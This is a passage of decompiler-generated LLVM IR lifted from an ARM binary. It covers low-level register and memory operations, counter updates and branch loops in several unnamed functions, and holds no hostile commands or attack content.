  %v3_1060c = load i32, i32* %v2_1060c, align 4
  store i32 %v3_1060c, i32* %r2.global-to-local, align 4
  %v1_10610 = add i32 %v1_1061c, 16
  %v2_10610 = inttoptr i32 %v1_10610 to i32*
  %v3_10610 = load i32, i32* %v2_10610, align 4
  store i32 %v3_10610, i32* @r1, align 4
  %v1_10614 = add i32 %v1_1061c, 24
  %v2_10614 = inttoptr i32 %v1_10614 to i32*
  %v3_10614 = load i32, i32* %v2_10614, align 4
  store i32 %v3_10614, i32* %r3.global-to-local, align 4
  %v1_10618 = add i32 %v3_1060c, 1
  store i32 %v1_10618, i32* %r2.global-to-local, align 4
  store i32 %v1_10618, i32* %v2_1060c, align 4
  %v0_10620 = load i32, i32* @r1, align 4
  %v1_10620 = load i32, i32* %r3.global-to-local, align 4
  %v3_10620 = icmp uge i32 %v0_10620, %v1_10620
  store i1 %v3_10620, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_10620, label %dec_label_pc_10630, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1060c
  %v2_10624 = inttoptr i32 %v0_10620 to i8*
  %v3_10624 = load i8, i8* %v2_10624, align 1
  %v4_10624 = zext i8 %v3_10624 to i32
  store i32 %v4_10624, i32* %r5.global-to-local, align 4
  %v6_10624 = add i32 %v0_10620, 1
  store i32 %v6_10624, i32* @r1, align 4
  %v2_10628 = load i32, i32* @r7, align 4
  %v3_10628 = add i32 %v2_10628, 16
  %v4_10628 = inttoptr i32 %v3_10628 to i32*
  store i32 %v6_10624, i32* %v4_10628, align 4
  br label %dec_label_pc_1063c

dec_label_pc_10630:                               ; preds = %dec_label_pc_1060c
  %v0_10630 = load i32, i32* @r7, align 4
  %v1_10634 = inttoptr i32 %v0_10630 to i16*
  %v2_10634 = call i32 @function_10e38(i16* %v1_10634)
  store i32 %v2_10634, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1063c

dec_label_pc_1063c:                               ; preds = %.thread2, %dec_label_pc_10630
  %v0_1063c = load i32, i32* @r7, align 4
  %v1_1063c = add i32 %v0_1063c, 60
  %v2_1063c = inttoptr i32 %v1_1063c to i32*
  %v3_1063c = load i32, i32* %v2_1063c, align 4
  %v1_10640 = add i32 %v3_1063c, -1
  store i32 %v1_10640, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10644 = icmp eq i32 %v1_10640, 0
  store i32 %v1_10640, i32* %v2_1063c, align 4
  br i1 %v2_10644, label %dec_label_pc_10650, label %dec_label_pc_106b0

dec_label_pc_10650:                               ; preds = %dec_label_pc_1063c
  %v0_10650 = load i32, i32* %r3.global-to-local, align 4
  %v1_10650 = load i32, i32* @r7, align 4
  %v2_10650 = add i32 %v1_10650, 64
  %v3_10650 = inttoptr i32 %v2_10650 to i32*
  store i32 %v0_10650, i32* %v3_10650, align 4
  %v0_10654 = load i32, i32* @r7, align 4
  %v1_10654 = add i32 %v0_10654, 56
  store i32 %v1_10654, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10658

dec_label_pc_10658:                               ; preds = %dec_label_pc_10688.dec_label_pc_10658_crit_edge, %dec_label_pc_10650
  %v0_10660 = phi i32 [ %v0_10660.pre, %dec_label_pc_10688.dec_label_pc_10658_crit_edge ], [ %v1_10654, %dec_label_pc_10650 ]
  %v0_10658 = phi i32 [ %v0_10658.pre, %dec_label_pc_10688.dec_label_pc_10658_crit_edge ], [ %v0_10654, %dec_label_pc_10650 ]
  %v1_10658 = add i32 %v0_10658, 56
  %v2_10658 = inttoptr i32 %v1_10658 to i32*
  %v3_10658 = load i32, i32* %v2_10658, align 4
  store i32 %v3_10658, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_10660, i32* %r2.global-to-local, align 4
  %v1_1066422 = inttoptr i32 %v0_10660 to i32*
  %v2_1066423 = load i32, i32* %v1_1066422, align 4
  store i32 %v2_1066423, i32* %r3.global-to-local, align 4
  %v3_1066825 = icmp uge i32 %v2_1066423, %v3_10658
  store i1 %v3_1066825, i1* %cpsr_c.global-to-local, align 1
  %v9_1066831 = icmp eq i32 %v2_1066423, %v3_10658
  br i1 %v9_1066831, label %dec_label_pc_10670, label %dec_label_pc_10688

dec_label_pc_10670:                               ; preds = %dec_label_pc_10658, %dec_label_pc_10670.dec_label_pc_10664_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10680 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10680, label %dec_label_pc_10684, label %dec_label_pc_10670.dec_label_pc_10664_crit_edge

dec_label_pc_10670.dec_label_pc_10664_crit_edge:  ; preds = %dec_label_pc_10670
  %v0_10664.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10668.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10664 = inttoptr i32 %v0_10664.pre to i32*
  %v2_10664 = load i32, i32* %v1_10664, align 4
  store i32 %v2_10664, i32* %r3.global-to-local, align 4
  %v3_10668 = icmp uge i32 %v2_10664, %v1_10668.pre
  store i1 %v3_10668, i1* %cpsr_c.global-to-local, align 1
  %v9_10668 = icmp eq i32 %v2_10664, %v1_10668.pre
  br i1 %v9_10668, label %dec_label_pc_10670, label %dec_label_pc_10688

dec_label_pc_10684:                               ; preds = %dec_label_pc_10670
  %v0_10684 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10684, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10688

dec_label_pc_10688:                               ; preds = %dec_label_pc_10658, %dec_label_pc_10670.dec_label_pc_10664_crit_edge, %dec_label_pc_10684
  %v0_10690 = phi i32 [ %v0_10684, %dec_label_pc_10684 ], [ %v2_1066423, %dec_label_pc_10658 ], [ %v2_10664, %dec_label_pc_10670.dec_label_pc_10664_crit_edge ]
  %v1_10688 = phi i32 [ %v0_10684, %dec_label_pc_10684 ], [ %v3_10658, %dec_label_pc_10658 ], [ %v1_10668.pre, %dec_label_pc_10670.dec_label_pc_10664_crit_edge ]
  %v3_10688 = icmp uge i32 %v0_10690, %v1_10688
  store i1 %v3_10688, i1* %cpsr_c.global-to-local, align 1
  %v9_10688 = icmp eq i32 %v0_10690, %v1_10688
  br i1 %v9_10688, label %dec_label_pc_10690, label %dec_label_pc_10688.dec_label_pc_10658_crit_edge

dec_label_pc_10688.dec_label_pc_10658_crit_edge:  ; preds = %dec_label_pc_10688
  %v0_10658.pre = load i32, i32* @r7, align 4
  %v0_10660.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10658

dec_label_pc_10690:                               ; preds = %dec_label_pc_10688
  %v2_10690 = icmp ne i32 %v1_10688, 0
  store i1 %v2_10690, i1* %cpsr_c.global-to-local, align 1
  %v7_10694 = icmp slt i32 %v1_10688, 2
  br i1 %v7_10694, label %dec_label_pc_106b0, label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %dec_label_pc_10690
  %v0_1069c = load i32, i32* @r1, align 4
  %v1_1069c = add i32 %v0_1069c, 129
  store i32 %v1_1069c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_106b0

dec_label_pc_106b0:                               ; preds = %.thread, %dec_label_pc_1063c, %dec_label_pc_10698, %dec_label_pc_10690, %dec_label_pc_105ac
  %v0_106b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_106b8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_106b8, i32* @r4, align 4
  store i32 %v6_1057c, i32* @r5, align 4
  store i32 %v9_1057c, i32* @r6, align 4
  store i32 %v12_1057c, i32* @r7, align 4
  store i32 %v15_1057c, i32* @lr, align 4
  ret i32 %v0_106b0

; uselistorder directives
  uselistorder i32 %v0_10684, { 1, 0, 2 }
  uselistorder i32 %v1_10668.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10620, { 1, 0, 2 }
  uselistorder i32 %v1_1061c, { 0, 2, 1 }
  uselistorder i32 %v1_105dc, { 1, 0 }
  uselistorder i32 %v3_10594, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_106b0, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_10688, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10670, { 1, 0 }
  uselistorder label %dec_label_pc_1063c, { 1, 0 }
  uselistorder label %dec_label_pc_1060c, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_105fc, { 1, 0 }
}

define i32 @function_106c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_106c0:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_106c0 = load i32, i32* @r4, align 4
  store i32 %v3_106c0, i32* %stack_var_-32, align 4
  %v6_106c0 = load i32, i32* @r5, align 4
  %v9_106c0 = load i32, i32* @r6, align 4
  %v12_106c0 = load i32, i32* @r7, align 4
  %v15_106c0 = load i32, i32* @r8, align 4
  %v24_106c0 = load i32, i32* @lr, align 4
  %v1_106c4 = add i32 %arg3, 52
  %v2_106c4 = inttoptr i32 %v1_106c4 to i32*
  %v3_106c4 = load i32, i32* %v2_106c4, align 4
  store i32 %v3_106c4, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106c8 = icmp eq i32 %v3_106c4, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_106c8, label %dec_label_pc_106dc, label %dec_label_pc_10740

dec_label_pc_106dc:                               ; preds = %dec_label_pc_106c0
  %v0_106dc = call i32 @function_f150()
  %v1_106e0 = add i32 %arg3, 64
  %v2_106e0 = inttoptr i32 %v1_106e0 to i32*
  %v3_106e0 = load i32, i32* %v2_106e0, align 4
  store i32 %v3_106e0, i32* %r3.global-to-local, align 4
  %v1_106e4 = add i32 %v0_106dc, -1168
  store i32 %v1_106e4, i32* @r8, align 4
  %v3_106e8 = icmp uge i32 %v3_106e0, %v1_106e4
  store i1 %v3_106e8, i1* %cpsr_c.global-to-local, align 1
  %v9_106e8 = icmp eq i32 %v3_106e0, %v1_106e4
  br i1 %v9_106e8, label %dec_label_pc_10734, label %dec_label_pc_106f0

dec_label_pc_106f0:                               ; preds = %dec_label_pc_106dc
  %v1_106f0 = add i32 %arg3, 56
  store i32 %v1_106f0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_106f0, i32* %r2.global-to-local, align 4
  %v0_106fc = load i32, i32* @r6, align 4
  store i32 %v0_106fc, i32* @r4, align 4
  %v1_1070036 = inttoptr i32 %v1_106f0 to i32*
  %v2_1070037 = load i32, i32* %v1_1070036, align 4
  store i32 %v2_1070037, i32* %r3.global-to-local, align 4
  %v3_1070439 = icmp uge i32 %v2_1070037, %v0_106fc
  store i1 %v3_1070439, i1* %cpsr_c.global-to-local, align 1
  %v9_1070445 = icmp eq i32 %v2_1070037, %v0_106fc
  br i1 %v9_1070445, label %dec_label_pc_1070c, label %dec_label_pc_10724

dec_label_pc_1070c:                               ; preds = %dec_label_pc_106f0, %dec_label_pc_1070c.dec_label_pc_10700_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1071c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1071c, label %dec_label_pc_10720, label %dec_label_pc_1070c.dec_label_pc_10700_crit_edge

dec_label_pc_1070c.dec_label_pc_10700_crit_edge:  ; preds = %dec_label_pc_1070c
  %v0_10700.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10704.pre = load i32, i32* @r4, align 4
  %v1_10700 = inttoptr i32 %v0_10700.pre to i32*
  %v2_10700 = load i32, i32* %v1_10700, align 4
  store i32 %v2_10700, i32* %r3.global-to-local, align 4
  %v3_10704 = icmp uge i32 %v2_10700, %v1_10704.pre
  store i1 %v3_10704, i1* %cpsr_c.global-to-local, align 1
  %v9_10704 = icmp eq i32 %v2_10700, %v1_10704.pre
  br i1 %v9_10704, label %dec_label_pc_1070c, label %dec_label_pc_10724

dec_label_pc_10720:                               ; preds = %dec_label_pc_1070c
  %v0_10720 = load i32, i32* @r4, align 4
  store i32 %v0_10720, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10724

dec_label_pc_10724:                               ; preds = %dec_label_pc_106f0, %dec_label_pc_1070c.dec_label_pc_10700_crit_edge, %dec_label_pc_10720
  %v0_10724 = phi i32 [ %v0_10720, %dec_label_pc_10720 ], [ %v2_1070037, %dec_label_pc_106f0 ], [ %v2_10700, %dec_label_pc_1070c.dec_label_pc_10700_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10724 = icmp eq i32 %v0_10724, 0
  br i1 %v2_10724, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_10724
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_10724, %bb
  store i32 67376, i32* @lr, align 4
  %v1_1072c = xor i1 %v2_10724, true
  call void @__pseudo_cond_branch(i1 %v1_1072c, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_10730 = load i32, i32* @r8, align 4
  %v1_10730 = load i32, i32* @r7, align 4
  %v2_10730 = add i32 %v1_10730, 64
  %v3_10730 = inttoptr i32 %v2_10730 to i32*
  store i32 %v0_10730, i32* %v3_10730, align 4
  br label %dec_label_pc_10734

dec_label_pc_10734:                               ; preds = %dec_label_pc_106dc, %bb20
  %v0_10734 = load i32, i32* @r7, align 4
  %v1_10734 = add i32 %v0_10734, 60
  %v2_10734 = inttoptr i32 %v1_10734 to i32*
  %v3_10734 = load i32, i32* %v2_10734, align 4
  %v1_10738 = add i32 %v3_10734, 1
  store i32 %v1_10738, i32* %r3.global-to-local, align 4
  store i32 %v1_10738, i32* %v2_10734, align 4
  %v0_10740.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_10744.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_10748.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10740

dec_label_pc_10740:                               ; preds = %dec_label_pc_106c0, %dec_label_pc_10734
  %v0_10748 = phi i32 [ %arg3, %dec_label_pc_106c0 ], [ %v0_10748.pre, %dec_label_pc_10734 ]
  %v0_10744 = phi i32 [ %arg2, %dec_label_pc_106c0 ], [ %v0_10744.pre, %dec_label_pc_10734 ]
  %v0_10740 = phi i32 [ %arg1, %dec_label_pc_106c0 ], [ %v0_10740.pre, %dec_label_pc_10734 ]
  store i32 %v0_10744, i32* %r1.global-to-local, align 4
  store i32 %v0_10748, i32* %r2.global-to-local, align 4
  %v3_1074c = inttoptr i32 %v0_10740 to i8*
  %v4_1074c = call i32 @function_10f64(i8* %v3_1074c, i32 %v0_10744, i32 %v0_10748)
  %v0_10750 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10750 = icmp eq i32 %v0_10750, 0
  store i32 %v4_1074c, i32* %r8.global-to-local, align 4
  br i1 %v2_10750, label %dec_label_pc_1075c, label %dec_label_pc_107d0

dec_label_pc_1075c:                               ; preds = %dec_label_pc_10740
  %v0_1075c = load i32, i32* @r7, align 4
  %v1_1075c = add i32 %v0_1075c, 60
  %v2_1075c = inttoptr i32 %v1_1075c to i32*
  %v3_1075c = load i32, i32* %v2_1075c, align 4
  %v1_10760 = add i32 %v3_1075c, -1
  store i32 %v1_10760, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10764 = icmp eq i32 %v1_10760, 0
  store i32 %v1_10760, i32* %v2_1075c, align 4
  br i1 %v2_10764, label %dec_label_pc_10770, label %dec_label_pc_107d0

dec_label_pc_10770:                               ; preds = %dec_label_pc_1075c
  %v0_10770 = load i32, i32* %r3.global-to-local, align 4
  %v1_10770 = load i32, i32* @r7, align 4
  %v2_10770 = add i32 %v1_10770, 64
  %v3_10770 = inttoptr i32 %v2_10770 to i32*
  store i32 %v0_10770, i32* %v3_10770, align 4
  %v0_10774 = load i32, i32* @r7, align 4
  %v1_10774 = add i32 %v0_10774, 56
  store i32 %v1_10774, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10778

dec_label_pc_10778:                               ; preds = %dec_label_pc_107a8.dec_label_pc_10778_crit_edge, %dec_label_pc_10770
  %v0_10780 = phi i32 [ %v0_10780.pre, %dec_label_pc_107a8.dec_label_pc_10778_crit_edge ], [ %v1_10774, %dec_label_pc_10770 ]
  %v0_10778 = phi i32 [ %v0_10778.pre, %dec_label_pc_107a8.dec_label_pc_10778_crit_edge ], [ %v0_10774, %dec_label_pc_10770 ]
  %v1_10778 = add i32 %v0_10778, 56
  %v2_10778 = inttoptr i32 %v1_10778 to i32*
  %v3_10778 = load i32, i32* %v2_10778, align 4
  store i32 %v3_10778, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_10780, i32* %r2.global-to-local, align 4
  %v1_1078424 = inttoptr i32 %v0_10780 to i32*
  %v2_1078425 = load i32, i32* %v1_1078424, align 4
  store i32 %v2_1078425, i32* %r3.global-to-local, align 4
  %v3_1078827 = icmp uge i32 %v2_1078425, %v3_10778
  store i1 %v3_1078827, i1* %cpsr_c.global-to-local, align 1
  %v9_1078833 = icmp eq i32 %v2_1078425, %v3_10778
  br i1 %v9_1078833, label %dec_label_pc_10790, label %dec_label_pc_107a8

dec_label_pc_10790:                               ; preds = %dec_label_pc_10778, %dec_label_pc_10790.dec_label_pc_10784_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_107a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_107a0, label %dec_label_pc_107a4, label %dec_label_pc_10790.dec_label_pc_10784_crit_edge

dec_label_pc_10790.dec_label_pc_10784_crit_edge:  ; preds = %dec_label_pc_10790
  %v0_10784.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10788.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10784 = inttoptr i32 %v0_10784.pre to i32*
  %v2_10784 = load i32, i32* %v1_10784, align 4
  store i32 %v2_10784, i32* %r3.global-to-local, align 4
  %v3_10788 = icmp uge i32 %v2_10784, %v1_10788.pre
  store i1 %v3_10788, i1* %cpsr_c.global-to-local, align 1
  %v9_10788 = icmp eq i32 %v2_10784, %v1_10788.pre
  br i1 %v9_10788, label %dec_label_pc_10790, label %dec_label_pc_107a8

dec_label_pc_107a4:                               ; preds = %dec_label_pc_10790
  %v0_107a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_107a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_107a8

dec_label_pc_107a8:                               ; preds = %dec_label_pc_10778, %dec_label_pc_10790.dec_label_pc_10784_crit_edge, %dec_label_pc_107a4
  %v0_107b0 = phi i32 [ %v0_107a4, %dec_label_pc_107a4 ], [ %v2_1078425, %dec_label_pc_10778 ], [ %v2_10784, %dec_label_pc_10790.dec_label_pc_10784_crit_edge ]
  %v1_107a8 = phi i32 [ %v0_107a4, %dec_label_pc_107a4 ], [ %v3_10778, %dec_label_pc_10778 ], [ %v1_10788.pre, %dec_label_pc_10790.dec_label_pc_10784_crit_edge ]
  %v3_107a8 = icmp uge i32 %v0_107b0, %v1_107a8
  store i1 %v3_107a8, i1* %cpsr_c.global-to-local, align 1
  %v9_107a8 = icmp eq i32 %v0_107b0, %v1_107a8
  br i1 %v9_107a8, label %dec_label_pc_107b0, label %dec_label_pc_107a8.dec_label_pc_10778_crit_edge

dec_label_pc_107a8.dec_label_pc_10778_crit_edge:  ; preds = %dec_label_pc_107a8
  %v0_10778.pre = load i32, i32* @r7, align 4
  %v0_10780.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10778

dec_label_pc_107b0:                               ; preds = %dec_label_pc_107a8
  %v2_107b0 = icmp ne i32 %v1_107a8, 0
  store i1 %v2_107b0, i1* %cpsr_c.global-to-local, align 1
  %v7_107b4 = icmp slt i32 %v1_107a8, 2
  br i1 %v7_107b4, label %dec_label_pc_107d0, label %dec_label_pc_107b8

dec_label_pc_107b8:                               ; preds = %dec_label_pc_107b0
  %v0_107bc = load i32, i32* %r1.global-to-local, align 4
  %v1_107bc = add i32 %v0_107bc, 129
  store i32 %v1_107bc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_107d0

dec_label_pc_107d0:                               ; preds = %dec_label_pc_1075c, %dec_label_pc_10740, %dec_label_pc_107b8, %dec_label_pc_107b0
  %v0_107d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_107d4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_107d4, i32* %r4.global-to-local, align 4
  store i32 %v6_106c0, i32* @r5, align 4
  store i32 %v9_106c0, i32* @r6, align 4
  store i32 %v12_106c0, i32* @r7, align 4
  store i32 %v15_106c0, i32* @r8, align 4
  store i32 %v24_106c0, i32* @lr, align 4
  ret i32 %v0_107d0

; uselistorder directives
  uselistorder i32 %v0_107a4, { 1, 0, 2 }
  uselistorder i32 %v1_10788.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10744, { 1, 0 }
  uselistorder i32 %v0_10748, { 1, 0 }
  uselistorder i32 %v1_10704.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_107d0, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_107a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10790, { 1, 0 }
  uselistorder label %dec_label_pc_10740, { 1, 0 }
  uselistorder label %dec_label_pc_10734, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_10724, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1070c, { 1, 0 }
}

define i32 @function_107dc() local_unnamed_addr {
dec_label_pc_107dc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_107dc = load i32, i32* @r4, align 4
  store i32 %v3_107dc, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r5.global-to-local, align 4
  %v4_107ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 160) to i32*), align 4
  store i32 %v4_107ec, i32* %r7.global-to-local, align 4
  %v0_107f0 = call i32 @function_f150()
  store i32 %v0_107f0, i32* %r0.global-to-local, align 4
  %v1_107f4 = add i32 %v4_107ec, 8
  %v2_107f4 = inttoptr i32 %v1_107f4 to i32*
  %v3_107f4 = load i32, i32* %v2_107f4, align 4
  store i32 %v3_107f4, i32* %r3.global-to-local, align 4
  %v1_107f8 = add i32 %v0_107f0, -1168
  store i32 %v1_107f8, i32* %r6.global-to-local, align 4
  %v3_107fc = icmp uge i32 %v3_107f4, %v1_107f8
  store i1 %v3_107fc, i1* %cpsr_c.global-to-local, align 1
  %v9_107fc = icmp eq i32 %v3_107f4, %v1_107f8
  br i1 %v9_107fc, label %dec_label_pc_10848, label %dec_label_pc_10808

dec_label_pc_10808:                               ; preds = %dec_label_pc_107dc
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_107ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1081493 = inttoptr i32 %v4_107ec to i32*
  %v2_1081494 = load i32, i32* %v1_1081493, align 4
  store i32 %v2_1081494, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1081896 = icmp eq i32 %v2_1081494, 0
  br i1 %v9_1081896, label %dec_label_pc_10820, label %dec_label_pc_10838

dec_label_pc_10820:                               ; preds = %dec_label_pc_10808, %dec_label_pc_10820.dec_label_pc_10814_crit_edge
  %v0_1082097 = phi i32 [ %v1_10818.pre, %dec_label_pc_10820.dec_label_pc_10814_crit_edge ], [ 0, %dec_label_pc_10808 ]
  store i32 %v0_1082097, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10830 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10830, label %dec_label_pc_10834, label %dec_label_pc_10820.dec_label_pc_10814_crit_edge

dec_label_pc_10820.dec_label_pc_10814_crit_edge:  ; preds = %dec_label_pc_10820
  %v0_10814.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10818.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10814 = inttoptr i32 %v0_10814.pre to i32*
  %v2_10814 = load i32, i32* %v1_10814, align 4
  store i32 %v2_10814, i32* %r3.global-to-local, align 4
  %v3_10818 = icmp uge i32 %v2_10814, %v1_10818.pre
  store i1 %v3_10818, i1* %cpsr_c.global-to-local, align 1
  %v9_10818 = icmp eq i32 %v2_10814, %v1_10818.pre
  br i1 %v9_10818, label %dec_label_pc_10820, label %dec_label_pc_10838

dec_label_pc_10834:                               ; preds = %dec_label_pc_10820
  %v0_10834 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10834, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10838

dec_label_pc_10838:                               ; preds = %dec_label_pc_10808, %dec_label_pc_10820.dec_label_pc_10814_crit_edge, %dec_label_pc_10834
  %v0_10838 = phi i32 [ %v0_10834, %dec_label_pc_10834 ], [ %v2_1081494, %dec_label_pc_10808 ], [ %v2_10814, %dec_label_pc_10820.dec_label_pc_10814_crit_edge ]
  %v1_10838 = phi i32 [ %v0_10834, %dec_label_pc_10834 ], [ 0, %dec_label_pc_10808 ], [ %v1_10818.pre, %dec_label_pc_10820.dec_label_pc_10814_crit_edge ]
  %v3_10838 = icmp uge i32 %v0_10838, %v1_10838
  store i1 %v3_10838, i1* %cpsr_c.global-to-local, align 1
  %v9_10838 = icmp eq i32 %v0_10838, %v1_10838
  br i1 %v9_10838, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_10838
  %v1_1083c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1083c, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_10838, %bb
  %v1_10840 = xor i1 %v9_10838, true
  call void @__pseudo_cond_branch(i1 %v1_10840, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_10844 = load i32, i32* %r6.global-to-local, align 4
  %v1_10844 = load i32, i32* %r7.global-to-local, align 4
  %v2_10844 = add i32 %v1_10844, 8
  %v3_10844 = inttoptr i32 %v2_10844 to i32*
  store i32 %v0_10844, i32* %v3_10844, align 4
  br label %dec_label_pc_10848

dec_label_pc_10848:                               ; preds = %dec_label_pc_107dc, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1084c = load i32, i32* %r5.global-to-local, align 4
  %v2_1084c = add i32 %v0_1084c, 160
  %v3_1084c = inttoptr i32 %v2_1084c to i32*
  %v4_1084c = load i32, i32* %v3_1084c, align 4
  store i32 %v4_1084c, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_10854 = add i32 %v0_1084c, 12
  %v3_10854 = inttoptr i32 %v2_10854 to i32*
  %v4_10854 = load i32, i32* %v3_10854, align 4
  store i32 %v4_10854, i32* %r3.global-to-local, align 4
  %v1_10858 = inttoptr i32 %v4_10854 to i32*
  %v2_10858 = load i32, i32* %v1_10858, align 4
  store i32 %v2_10858, i32* %r1.global-to-local, align 4
  %v1_1085c = add i32 %v4_1084c, 4
  %v2_1085c = inttoptr i32 %v1_1085c to i32*
  %v3_1085c = load i32, i32* %v2_1085c, align 4
  %v2_10860 = icmp ne i32 %v2_10858, 0
  store i1 %v2_10860, i1* %cpsr_c.global-to-local, align 1
  %v7_10860 = icmp eq i32 %v2_10858, 1
  %v1_10864 = add i32 %v3_1085c, 1
  store i32 %v1_10864, i32* %r3.global-to-local, align 4
  store i32 %v1_10864, i32* %v2_1085c, align 4
